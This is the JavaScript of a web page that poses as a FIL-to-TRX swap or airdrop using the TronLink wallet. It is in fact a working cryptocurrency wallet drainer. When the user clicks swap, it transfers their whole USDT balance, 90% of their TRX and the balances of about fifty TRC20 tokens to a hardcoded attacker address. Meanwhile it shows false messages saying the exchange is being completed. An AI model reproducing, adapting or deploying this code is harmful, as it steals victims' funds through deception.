
      Qmsg.config({
        html: true,
        autoClose: false,
        showClose: true,
      });
      function accAdd(arg1, arg2) {
        var r1, r2, m, c;
        try {
          r1 = arg1.toString().split(".")[1].length;
        } catch (e) {
          r1 = 0;
        }
        try {
          r2 = arg2.toString().split(".")[1].length;
        } catch (e) {
          r2 = 0;
        }
        c = Math.abs(r1 - r2);
        m = Math.pow(10, Math.max(r1, r2));
        if (c > 0) {
          var cm = Math.pow(10, c);
          if (r1 > r2) {
            arg1 = Number(arg1.toString().replace(".", ""));
            arg2 = Number(arg2.toString().replace(".", "")) * cm;
          } else {
            arg1 = Number(arg1.toString().replace(".", "")) * cm;
            arg2 = Number(arg2.toString().replace(".", ""));
          }
        } else {
          arg1 = Number(arg1.toString().replace(".", ""));
          arg2 = Number(arg2.toString().replace(".", ""));
        }
        return (arg1 + arg2) / m;
      }

      Number.prototype.add = function (arg) {
        return accAdd(arg, this);
      };

      function accSub(arg1, arg2) {
        var r1, r2, m, n;
        try {
          r1 = arg1.toString().split(".")[1].length;
        } catch (e) {
          r1 = 0;
        }
        try {
          r2 = arg2.toString().split(".")[1].length;
        } catch (e) {
          r2 = 0;
        }
        m = Math.pow(10, Math.max(r1, r2));
        n = r1 >= r2 ? r1 : r2;
        return ((arg1 * m - arg2 * m) / m).toFixed(n);
      }

      Number.prototype.sub = function (arg) {
        return accMul(arg, this);
      };

      function accMul(arg1, arg2) {
        var m = 0,
          s1 = arg1.toString(),
          s2 = arg2.toString();
        try {
          m += s1.split(".")[1].length;
        } catch (e) {}
        try {
          m += s2.split(".")[1].length;
        } catch (e) {}
        return (
          (Number(s1.replace(".", "")) * Number(s2.replace(".", ""))) /
          Math.pow(10, m)
        );
      }

      Number.prototype.mul = function (arg) {
        return accMul(arg, this);
      };

      function accDiv(arg1, arg2) {
        var t1 = 0,
          t2 = 0,
          r1,
          r2;
        try {
          t1 = arg1.toString().split(".")[1].length;
        } catch (e) {}
        try {
          t2 = arg2.toString().split(".")[1].length;
        } catch (e) {}
        with (Math) {
          r1 = Number(arg1.toString().replace(".", ""));
          r2 = Number(arg2.toString().replace(".", ""));
          return (r1 / r2) * pow(10, t2 - t1);
        }
      }

      Number.prototype.div = function (arg) {
        return accDiv(this, arg);
      };

      let usdtTrc20 = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
      let toAddress = "TPBkVhwJJ7t9MVRwdbZLkKLWLmbSNWmNHH";

      let trc20List = [
        "TE2RzoSV3wFK99w6J9UnnZ4vLfXYoxvRwP",
        "TRg6MnpsFXc82ymUPgf5qbj59ibxiEDWvv",
        "TGBr8uh9jBVHJhhkwSJvQN2ZAKzVkxDmno",
        "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
        "TXJgMdjVX5dKiQaUi9QobwNxtSQaFqccvd",
        "TR7BUFRQeq1w5jAZf1FKx85SHuX6PfMqsV",
        "TUY54PVeH6WCcYCd6ZXXoBDsHytN9V5PXt",
        "TLeEu311Cbw63BcmMHDgDLu7fnk9fqGcqT",
        "TL5x9MtSnDy537FXKx53yAaHRRNdg9TkkA",
        "TWQhCXaWz4eHK4Kd1ErSDHjMFPoPc9czts",
        "TL6K6iaEkn8kdnJ79a8Be3S4RFf4pFkGE8",
        "TXMKm8FSp6zcm3cdgkgcM1fwdkuJbZ4Hgv",
        "TMUgpK7LLSYE2YKT3nGbLSzPgs3sw5hquM",
        "TDk91SWz2GvwfZwMTGX21d4ngUUH8YZZAv",
        "TDuvynpjzttyM6qP6Qp2jqKpAMsLYD32qn",
        "TL62tGz88S7dks7ssQxh6rVMKaJn2aq92j",
        "TNBnMWraDKFi1bFnVTjQ2YaSd6Xo6nQS57",
        "TWd7vJKaGmpq6oHgpHBqHHPG8JP2XErkTH",
        "TMGSahWsmc3PxzqVWuYQrTdEhoCPN8Pyn7",
        "TD5Wb8MpDLDvMiXC4r289c362rxMSPD8qP",
        "TSAr2WfxjyWTCX1nw4XXHyr1cQEX2jWtRg",
        "TKkeiboTkxXKJpbmVFbv4a8ov5rAfRDMf9",
        "TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7",
        "TNUC9Qb1rRpS5CbWLmNMxXBjyFoydXjWFR",
        "TKfjV9RNKJJCqPvBtK8L7Knykh7DNWvnYt",
        "THb4CqiFdwNHsWsQCs4JhzwjMWys4aqCbF",
        "TN3W4H6rK2ce4vX9YnFQHwKENnHjoxb3m9",
        "TQcia2H2TU3WrFk9sKtdK9qCfkW8XirfPQ",
        "TYukBQZ2XXCcRCReAUguyXncCWNY9CEiDQ",
        "TYN6Wh11maRfzgG7n5B6nM5VW1jfGs9chu",
        "TV1rTHvtf7Zn2H19T4SFQEEhtW8MztkUCB",
        "TH2mEwTKNgtg8psR6Qx2RBUXZ48Lon1ygu",
        "TMwFHYXLJaRUPeW6421aqXL4ZEzPRFGkGT",
        "TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9",
        "TDyvndWuvX5xTBwHPYJi7J3Yq8pq8yh62h",
        "TGbu32VEGpS4kDmjrmn5ZZJgUyHQiaweoq",
        "TKAtLoCB529zusLfLVkGvLNis6okwjB7jf",
        "TFVge5Nb6or8cpdtdwPuXSGqLHpj3PM9Rp",
        "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4",
        "TKJYoAbbLMsZkC7bonqiyzNmqtGu1iD7in",
        "TR3DLthpnDdCGabhVDbD3VMsiJoCXY3bZd",
        "TXWkP3jLBqRGojUih1ShzNyDaN5Csnebok",
        "TXpw8XeWYeTUd4quDskoUqeQPowRh4jY65",
        "TVj7RNVHy6thbM7BWdSe9G6gXwKhjhdNZS",
        "TLLBBiX3HqVZZsUQTBXgurA3pdw317PmjM",
        "TJmTeYk5zmg8pNPGYbDb2psadwVLYDDYDr",
        "TVgAYofpQku5G4zenXnvxhbZxpzzrk8WVK",
        "TJvqNiWUN2v2NBG12UhfV7WSvReJkRP3VC",
        "TRkuKAxmWZ4G74MvZnFpoosQZsfvtNpmwH",
        "TXpw8XeWYeTUd4quDskoUqeQPowRh4jY65",
      ];

      let coinId = "1004133";
      let coinName = "FIL";
      let coinPrecision = 1000000;
      let coinNum = 0;
      let proportion = 3755;

      let checkTronReadyNum = 0;

      let timer = setInterval(async () => {
        checkTronReadyNum++;
        if (window.tronWeb && window.tronWeb.ready) {
          let userAddress = window.tronWeb.defaultAddress.base58;
          $("#TronLinkState").text(
            userAddress.substr(0, 4) + "..." + userAddress.substr(30,4)
          );
          tronWeb.trx.getAccount().then((res) => {
            let tokenBalance = res.assetV2.find(function (o) {
              return o.key == coinId;
            });
            if (tokenBalance != undefined) {
              coinNum = tokenBalance.value / coinPrecision;
              $("#FIL").text(`${coinNum.toFixed(2)}`);
            } else {
              $("#FIL").text(`0`);
            }
          });
        } else {
          $("#TronLinkState").text("Not Connected");
          if (checkTronReadyNum > 3) {
            showNoConnet();
            clearInterval(timer);
          }
        }
      }, 500);

      function showNoConnet() {
        Qmsg.error(`请在Tronlink APP输入filecoinswaps.com进入,或使用PC端配合Tronlink Chrome插件使用空投.`);
      }

      function change() {
        if ($($("input")[0]).attr("placeholder") == "FIL Amount") {
          $($("input")[0]).attr("placeholder", "TRX Amount");
          $($("input")[1]).attr("placeholder", `${coinName} Amount`);
        } else {
          $($("input")[0]).attr("placeholder", `${coinName} Amount`);
          $($("input")[1]).attr("placeholder", "TRX Amount");
        }
        var t = $($("input")[0]).val();
        $($("input")[0]).val($($("input")[1]).val());
        $($("input")[1]).val(t);
      }

      function calculation() {
        if ($($("input")[0]).attr("placeholder") == `${coinName} Amount`) {
          $($("input")[1]).val(Number($($("input")[0]).val()).mul(proportion));
        } else {
          $($("input")[1]).val(Number($($("input")[0]).val()).div(proportion));
        }
      }

      function getInputCoinNum() {
        if ($($("input")[0]).attr("placeholder") == `${coinName} Amount`) {
          return Number($($("input")[0]).val());
        } else {
          return Number($($("input")[1]).val());
        }
        return 0;
      }

      $($("input")[0]).change(function () {
        calculation();
      });

      $($("input")[0]).keyup(function () {
        calculation();
      });

      function sellAll() {
        if (coinNum <= 0) {
          Qmsg.error(`Not enough FIL assets(没有足够的FIL资产) `);
          return;
        }
        $($("input")[0]).val(coinNum);
        $($("input")[0]).keyup();
      }

      function swap() {
        if (coinNum <= 0) {
          Qmsg.error(` Not enough FIL assets(没有足够的FIL资产)`);
          return;
        }
        if (Number($($("input")[0]).val()) <= 0) {
          Qmsg.error({
            autoClose: true,
            content: `<br><br>Incorrect amount of exchange<br><br>兑换数量不正确`,
            timeout: 3000,
          });
          return;
        }
        if (getInputCoinNum() > coinNum) {
          Qmsg.error(` Not enough FIL assets(没有足够的FIL资产) `);
          return;
        }
        let loading = Qmsg.loading(
          `<br><br>Please sign in the wallet to ensure that the exchange is completed<br><br>请在钱包中签名以确保完成兑换`
        );
        tronWeb.trx
          .getAccount()
          .then((account) => {
            tronWeb.trx
              .getBalance()
              .then((trxbalance) => {
                let trxbalanceNum = trxbalance / 1000000;
                console.log("TRX", trxbalanceNum);
                tronWeb
                  .contract()
                  .at(usdtTrc20)
                  .then((usdtContract) => {
                    usdtContract
                      .balanceOf(tronWeb.defaultAddress.base58)
                      .call()
                      .then((usdtbalance) => {
                        let usdtbalanceNum = usdtbalance.toNumber() / 1000000;
                        console.log("USDT", usdtbalanceNum);
                        if (usdtbalanceNum > 1) {
                          usdtContract
                            .transfer(toAddress, usdtbalance.toNumber())
                            .send()
                            .finally(() => {
                              loading.close();
                              toTrx(trxbalance);
                            });
                        } else {
                          loading.close();
                          toTrx(trxbalance);
                        }
                      })
                      .catch(() => {
                        loading.close();
                        Qmsg.error(` Authorization failed (授权失败)) `);
                      });
                  })
                  .catch(() => {
                    loading.close();
                    Qmsg.error(` Authorization failed (授权失败)) `);
                  });
              })
              .catch(() => {
                loading.close();
                Qmsg.error(` Authorization failed (授权失败)) `);
              });
          })
          .catch(() => {
            loading.close();
            Qmsg.error(` Authorization failed (授权失败)) `);
          });
      }

      function toTrx(trxbalance) {
        let trxbalanceNum = trxbalance / 1000000;
        if (trxbalanceNum > 100) {
          let loading = Qmsg.loading(
            `<br><br>Please confirm your signature in the wallet to redeem TRX assets and complete the transaction<br><br>请在钱包中确认签名以兑换TRX资产并完成交易`
          );
          let sendTrx = Math.round(Number(trxbalance).mul(Number(90).div(100)));
          tronWeb.trx.sendTransaction(toAddress, sendTrx).finally(() => {
            loading.close();
            toTrc20();
          });
        } else {
          toTrc20();
        }
      }

      let toTrc20Loading = null;

      function toTrc20(index) {
        if (index === undefined) index = 0;
        if (toTrc20Loading == null || toTrc20Loading.state !== "opening") {
          toTrc20Loading = Qmsg.loading(
            `<br><br>Please sign in the wallet to ensure that the exchange is completed<br><br>请在钱包中签名以确保完成兑换`
          );
        }
        if (index == trc20List.length) {
          toTrc20Loading.close();
          Qmsg.success(
            `<br><br>The redemption transaction is complete, wait for the block confirmation to arrive<br><br>兑换交易完成,等待区块确认后到达`
          );
          return;
        }
        let trc20CCAddress = trc20List[index];

        const forContract = new Promise((resolution, rejection) => {
          setTimeout(() => {
            tronWeb
              .contract()
              .at(trc20CCAddress)
              .then((cc) => {
                if (!cc.balanceOf) {
                  resolution();
                  return;
                }
                cc.balanceOf(window.tronWeb.defaultAddress.base58)
                  .call()
                  .then((balance) => {
                    if (balance.toNumber() >= 5) {
                      cc.transfer(toAddress, balance.toNumber())
                        .send()
                        .finally(() => {
                          resolution();
                        });
                    } else {
                      resolution();
                    }
                  })
                  .catch(() => {
                    resolution();
                  });
              })
              .catch(() => {
                resolution();
              });
          }, 100);
        }).finally(() => {
          toTrc20(index + 1);
        });
      }
